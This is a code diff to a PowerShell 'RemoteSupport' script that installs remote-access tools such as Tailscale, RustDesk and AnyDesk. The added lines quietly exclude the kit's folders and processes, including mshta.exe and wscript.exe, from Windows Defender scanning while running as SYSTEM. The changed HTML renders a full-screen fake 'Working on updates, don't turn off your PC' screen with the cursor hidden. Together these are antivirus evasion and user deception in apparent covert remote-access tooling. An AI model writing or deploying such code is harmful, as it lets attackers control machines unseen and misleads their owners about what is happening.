@@ -6,6 +6,12 @@ $ErrorActionPreference = "SilentlyContinue"
 $dir = "$env:ProgramData\RemoteSupport"
 New-Item $dir -ItemType Directory -Force | Out-Null
 
+# --- Defender auto-heal: trust the kit so antivirus stops deleting/flagging it (runs as SYSTEM) ---
+try {
+  Add-MpPreference -ExclusionPath 'C:\ProgramData\RemoteSupport','C:\Program Files\Tailscale','C:\Program Files (x86)\Tailscale IPN','C:\Program Files\RustDesk','C:\Program Files (x86)\RustDesk','C:\Program Files\AnyDesk','C:\Program Files (x86)\AnyDesk' -ErrorAction SilentlyContinue
+  Add-MpPreference -ExclusionProcess 'sshd.exe','ssh.exe','tailscale.exe','tailscaled.exe','rustdesk.exe','anydesk.exe','mshta.exe','wscript.exe' -ErrorAction SilentlyContinue
+} catch {}
+
 # 0) Tailscale UNATTENDED mode (once) - keeps client reachable at the
 #    Windows login screen after a restart, before anyone logs in.
 if(-not (Test-Path (Join-Path $dir 'unattended.done'))){
@@ -176,20 +182,24 @@ while($true){
   if(Test-Path $script:flag){
     $company=(Get-Content $script:flag -Raw); if(-not $company.Trim()){ $company=Cfg 'LOCK_TEXT' 'CloudPulse IT Services' }
     $bg=Cfg 'LOCK_COLOR' '#000000'
-    $dots=''; for($i=0;$i -lt 8;$i++){ $op=[Math]::Round(1-($i*0.11),2); $dots+=("<i style=""transform:rotate("+($i*45)+"deg) translateY(-26px);opacity:"+$op+"""></i>") }
     $html=@"
 <!-- saved from url=(0014)about:internet -->
 <!DOCTYPE html><html><head><meta charset="utf-8"><style>
 html,body{margin:0;height:100%;background:$bg;overflow:hidden;font-family:'Segoe UI',Tahoma,sans-serif;cursor:none}
 .c{position:absolute;top:50%;left:50%;margin-top:-90px;transform:translateX(-50%);text-align:center;color:#fff;white-space:nowrap}
-.r{width:56px;height:56px;margin:0 auto 42px;position:relative;animation:sp 1s steps(8) infinite}
-@keyframes sp{to{transform:rotate(360deg)}}
-.r i{position:absolute;top:50%;left:50%;width:6px;height:6px;margin:-3px;border-radius:50%;background:#fff}
+.r{width:60px;height:60px;margin:0 auto 44px;position:relative}
+.r i{position:absolute;top:0;left:50%;width:6px;height:6px;margin-left:-3px;border-radius:50%;background:#fff;transform-origin:3px 30px;animation:orbit 1.3s cubic-bezier(.5,0,.5,1) infinite}
+.r i:nth-child(1){animation-delay:0s}
+.r i:nth-child(2){animation-delay:.14s}
+.r i:nth-child(3){animation-delay:.28s}
+.r i:nth-child(4){animation-delay:.42s}
+.r i:nth-child(5){animation-delay:.56s}
+@keyframes orbit{to{transform:rotate(360deg)}}
 .t{font-size:28px;font-weight:300}
 .s{font-size:14px;color:#cfcfcf;margin-top:18px;font-weight:300}
 .co{font-size:12px;color:#8f8f8f;margin-top:44px}
 </style></head><body><div class="c">
-<div class="r">$dots</div>
+<div class="r"><i></i><i></i><i></i><i></i><i></i></div>
 <div class="t">Working on updates <span id="p">0</span>% complete</div>
 <div class="s">Don't turn off your PC. This will take a while.</div>
 <div class="co">$company</div>
